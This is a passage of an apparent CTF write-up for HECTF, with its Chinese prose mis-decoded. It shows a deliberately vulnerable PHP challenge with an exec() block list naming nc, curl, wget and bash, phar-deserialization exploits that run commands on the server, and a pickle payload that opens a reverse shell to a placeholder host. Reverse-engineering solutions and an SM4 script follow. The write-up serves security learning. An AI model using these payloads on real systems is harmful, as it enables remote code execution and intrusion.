class="variable">$_GET</span>[<span class="string">&#x27;show&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_string</span>(<span class="variable">$show</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.\./&#x27;</span>, <span class="variable">$show</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/zip/i&#x27;</span>,<span class="variable">$show</span>))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Not this !!!&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ob_start</span>(<span class="string">&#x27;ob_gzhandler&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">page_tshow</span>(<span class="params"><span class="variable">$show</span></span>) </span>&#123;</span><br><span class="line"><span class="meta">?&gt;</span>&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id=<span class="string">&quot;header&quot;</span>&gt;</span><br><span class="line">&lt;center&gt;&lt;a href=<span class="string">&quot;?show=home&quot;</span> <span class="class"><span class="keyword">class</span>=&quot;<span class="title">logo</span>&quot;&gt;&lt;<span class="title">img</span> <span class="title">src</span>=&quot;<span class="title">images</span>/<span class="title">logo</span>.<span class="title">jpg</span>&quot; <span class="title">alt</span>=&quot;&quot;&gt;&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">center</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">body</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">function</span> <span class="title">fatal</span>($<span class="title">msg</span>) </span>&#123;</span><br><span class="line"><span class="meta">?&gt;</span>&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">article</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">h2</span>&gt;<span class="title">Error</span>&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">p</span>&gt;&lt;?=$<span class="title">msg</span>;?&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class"><span class="title">exit</span>(1);</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">page_tshow</span>($<span class="title">show</span>);</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">if</span>(!(<span class="title">include</span> $<span class="title">show</span> . &#x27;.<span class="title">php</span>&#x27;))</span></span><br><span class="line"><span class="class">    <span class="title">fatal</span>(&#x27;<span class="title">no</span> <span class="title">no</span> <span class="title">no</span>&#x27;);</span></span><br><span class="line"><span class="class"><span class="title">if</span>(<span class="title">isset</span>($<span class="title">file</span>))</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>))</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$file</span>.<span class="string">&quot;surely exists&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span>   </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$file</span>.<span class="string">&quot;dont exist&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>home.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;common.php&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">article</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">h2</span>&gt;<span class="title">Welcome</span> <span class="title">to</span> <span class="title">HECTF</span> ï¼ï¼ï¼&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">        <span class="title">Click</span> <span class="title">here</span> <span class="title">to</span> <span class="title">upload</span> <span class="title">your</span> <span class="title">file</span> =&gt; &lt;<span class="title">a</span> <span class="title">href</span>=&quot;?<span class="title">show</span>=<span class="title">upload</span>&quot;&gt;ä¼ é€é—¨&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">center</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></table></figure><p>upload.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;common.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$fn</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$ft</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_uploaded_file</span>(<span class="variable">$fn</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">fatal</span>(<span class="string">&#x27;uploaded file corrupted&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$array</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/png&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ft</span>,<span class="variable">$array</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">fatal</span>(<span class="string">&quot;No, I want png picture áµ•á·„Î¹ Ì áµ•á·…&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$imagekey</span> = <span class="title function_ invoke__">create_image_key</span>();</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$fn</span>, <span class="string">&quot;uploads/<span class="subst">$imagekey</span>.png&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ?show=show&amp;imagekey=<span class="subst">$imagekey</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">article</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">h2</span>&gt;<span class="title">Plz</span> <span class="title">Give</span> <span class="title">me</span> <span class="title">a</span> <span class="title">file</span> <span class="title">I</span> <span class="title">want</span>.&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">form</span> <span class="title">enctype</span>=&quot;<span class="title">multipart</span>/<span class="title">form</span>-<span class="title">data</span>&quot; <span class="title">action</span>=&quot;?<span class="title">show</span>=<span class="title">upload</span>&quot; <span class="title">method</span>=&quot;<span class="title">POST</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">image</span>&quot;&gt;áµ•á·„Î¹ Ì áµ•á·…    </span></span><br><span class="line"><span class="class"> &lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">file</span>&quot; <span class="title">id</span>=&quot;<span class="title">image</span>&quot; <span class="title">name</span>=&quot;<span class="title">image</span>&quot; /&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">br</span> /&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">name</span>=&quot;<span class="title">submit</span>&quot; <span class="title">value</span>=&quot;<span class="title">Upload</span>&quot; /&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">center</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class">?&gt;</span></span><br></pre></td></tr></table></figure><p>common.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;FROM_INDEX&#x27;</span>)) <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;MAX_IM_SIZE&#x27;</span>, <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">create_image_key</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">sha1</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] . <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>] . <span class="title function_ invoke__">time</span>() . <span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">load_image</span>(<span class="params"><span class="variable">$imagekey</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">1</span> !== <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9a-f]&#123;40&#125;/&#x27;</span>, <span class="variable">$imagekey</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">fatal</span>(<span class="string">&#x27;Invalid image key.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefrompng</span>(<span class="string">&quot;uploads/<span class="subst">&#123;$imagekey&#125;</span>.png&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$im</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">fatal</span>(<span class="string">&#x27;Failed to load image.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$im</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HeCTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hectf</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>( <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;hectf) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]/&#x27;</span>,<span class="variable">$this</span>-&gt;hectf) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$this</span>-&gt;hectf))</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|php|python|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$this</span>-&gt;cmd))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;No no no no no!&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®¡è®¡æºç ï¼Œå›¾ç‰‡ä¸Šä¼ ç‚¹+<code>file_exists()</code>å‡½æ•°+è‡ªå®šä¹‰<code>HeCTF</code>ç±»ï¼Œåˆ¤æ–­ä¸ºæ–‡ä»¶ä¸Šä¼ +pharååºåˆ—åŒ–åˆ©ç”¨ã€‚</p><p><code>HeCTF</code>ç±»ä¸­RCEä½¿ç”¨ <code>tee</code> å‘½ä»¤ç»•è¿‡è¿‡æ»¤å†™æ–‡ä»¶ã€‚</p><p>æ„é€ pharæ–‡ä»¶ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HeCTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hectf</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); </span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title function_ invoke__">HeCTF</span>();   </span><br><span class="line"><span class="variable">$o</span>-&gt;hectf = <span class="keyword">array</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line"><span class="variable">$o</span>-&gt;cmd = <span class="string">&#x27;ls / | tee 1&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><p>å°†ç”Ÿæˆçš„pharæ–‡ä»¶æ”¹ä¸ºpngåç¼€ä¸Šä¼ ï¼Œåœ¨index.phpä»¥POSTæ–¹å¼ä¼ å…¥fileå€¼ï¼Œåˆ©ç”¨pharä¼ªåè®®ååºåˆ—åŒ–RCEï¼š</p><p><code>POST: file=phar://uploads/25c3a34d93227241d5dacc8eb84a80ef2aabeab1.png</code></p><p>è¯»åˆ°flagæ–‡ä»¶å <code>/ffflllllaaaaggg</code>ï¼ŒåŒæ ·æ“ä½œæ„é€ è¯»flagå†…å®¹çš„pharæ–‡ä»¶ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HeCTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hectf</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); </span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title function_ invoke__">HeCTF</span>();   </span><br><span class="line"><span class="variable">$o</span>-&gt;hectf = <span class="keyword">array</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line"><span class="variable">$o</span>-&gt;cmd = <span class="string">&#x27;cat /ffflllllaaaaggg | tee 1&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="çš®æ‰£çš„å•†åº—"><a href="#çš®æ‰£çš„å•†åº—" class="headerlink" title="çš®æ‰£çš„å•†åº—"></a>çš®æ‰£çš„å•†åº—</h3><p>è¿›å…¥é¡µé¢å‘ç°å¯ä»¥ç‚¹å‡»æŒ‰é’®ï¼Œä½†æ˜¯æ²¡é’±å¯ç”¨ï¼Œç‚¹å‡»æ—¶å‘ç°cookieæ˜¯å˜åŒ–çš„ã€‚</p><p>cookieåƒbase64ï¼Œè§£ç ï¼Œç»“åˆé¢˜ç›®å¯çŸ¥ä¸ºjsonçš„pickleåºåˆ—åŒ–ç»“æœï¼Œåæ¨ä¸€ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">enc = <span class="string">&quot;gAN9cQAoWAUAAABtb25leXEBTfQBWAcAAABoaXN0b3J5cQJdcQNYEAAAAGFudGlfdGFtcGVyX2htYWNxBFggAAAAYWExYmE0ZGU1NTA0OGNmMjBlMGE3YTYzYjdmOGViNjJxBXUu&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(pickle.loads(b64decode(enc)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#123;&#x27;money&#x27;: 500, &#x27;history&#x27;: [], &#x27;anti_tamper_hmac&#x27;: &#x27;aa1ba4de55048cf20e0a7a63b7f8eb62&#x27;&#125;</span></span><br></pre></td></tr></table></figure><p>å¯è§ä½¿ç”¨äº†hmacå“ˆå¸Œï¼Œæ— æ³•çˆ†ç ´ï¼Œä½†å¯ä»¥æ„é€ RCEä»£ç åºåˆ—åŒ–åæ”¾å…¥cookieï¼Œç‚¹å‡»æŒ‰é’®æ‰§è¡Œæ¶æ„ä»£ç ï¼Œç”±äºé¡µé¢æ— ç»“æœå›æ˜¾ï¼Œæ„é€ åå¼¹shellä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;bash -c \&quot;bash -i &gt; /dev/tcp/[IP]/[Port] 0&gt;&amp;1 2&gt;&amp;1\&quot;&quot;</span>,))</span><br><span class="line">a = A()</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(pickle.dumps(a)))</span><br></pre></td></tr></table></figure><p>æ›¿æ¢cookieåï¼Œç‚¹å‡»æŒ‰é’®å³å¯åœ¨vps getshellæ‹¿flagã€‚</p><p>â€‹    </p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="è´æ–¯"><a href="#è´æ–¯" class="headerlink" title="è´æ–¯"></a>è´æ–¯</h3><p>å˜è¡¨base32ï¼ŒCyberchefä¸€æŠŠæ¢­å¾—åˆ°flagã€‚</p><p>â€‹    </p><h3 id="apk"><a href="#apk" class="headerlink" title="apk"></a>apk</h3><blockquote><p>å¦‚ä½•åˆ†æApkå‘¢</p></blockquote><p>ç”¨jadxæ‰“å¼€apkï¼Œåœ¨AndroidManifest.xmlé‡Œå‘ç°ï¼š</p><p><code>&lt;meta-data android:name=&quot;çˆ¶æ‹‰å“¥&quot; android:value=&quot;ä»˜æ‹‰å“¥å¤´&#123;Apktool_or_jadx&#125;&quot;/&gt;</code></p><p>flagï¼š<code>HECTF&#123;Apktool_or_jadx&#125;</code></p><p>â€‹    </p><h3 id="HelloIos"><a href="#HelloIos" class="headerlink" title="HelloIos"></a>HelloIos</h3><blockquote><p>ç®€å•çš„ios</p></blockquote><p>æ‰¾åˆ°å…³é”®åŠ å¯†å‡½æ•°ï¼Œç®€å•å¼‚æˆ–è¿˜åŸflagã€‚</p><p>â€‹    </p><h3 id="ezre"><a href="#ezre" class="headerlink" title="ezre"></a>ezre</h3><blockquote><p>easy reverse</p></blockquote><p>åŠ å¯†é€»è¾‘å¾ˆéš¾çœ‹ï¼Œåˆ©ç”¨IDAçš„findcryptæ’ä»¶å¯ä»¥è¯†åˆ«å‡ºå­˜åœ¨SM4åŠ å¯†ç®—æ³•çš„å…³é”®å‚æ•°æ•°ç»„ã€‚</p><p>åˆ©ç”¨åŠ¨è°ƒæ‰¾åˆ°SM4åŠ å¯†ä½¿ç”¨çš„128ä½keyå€¼ï¼Œå¯¼å‡ºhexï¼š<code>AD763B4FCDCFD9251089FB0408A45F80</code>ï¼Œä»¥åŠ128bitå¯†æ–‡ï¼Œå¯¼å‡ºhexï¼š<code>D75CDA22176DD392A1A570915F66A61C</code>ã€‚</p><p>æ‰¾ä¸€ä¸ªSM4ç®—æ³•çš„pythonè„šæœ¬è§£å¯†å¾—åˆ°flagï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SM4Cipher</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, key: <span class="built_in">bytes</span></span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">len</span>(key) == <span class="number">16</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;SM4 key must be length of 16. &quot;</span>)</span><br><span class="line">        self._key_r = self._generate_key(key)</span><br><span class="line">        self.block_size = <span class="number">16</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self, plaintext: <span class="built_in">bytes</span></span>):</span><br><span class="line">        <span class="keyword">return</span> self._do(plaintext, self._key_r)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">self, ciphertext: <span class="built_in">bytes</span></span>):</span><br><span class="line">        <span class="keyword">return</span> self._do(ciphertext, self._key_r[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_do</span>(<span class="params">self, text: <span class="built_in">bytes</span>, key_r: <span class="built_in">list</span></span>):</span><br><span class="line">        text_ = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">        <span class="comment"># å°† 128bit è½¬åŒ–æˆ 4x32bit</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            text_[i] = <span class="built_in">int</span>.from_bytes(text[<span class="number">4</span> * i:<span class="number">4</span> * i + <span class="number">4</span>], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span 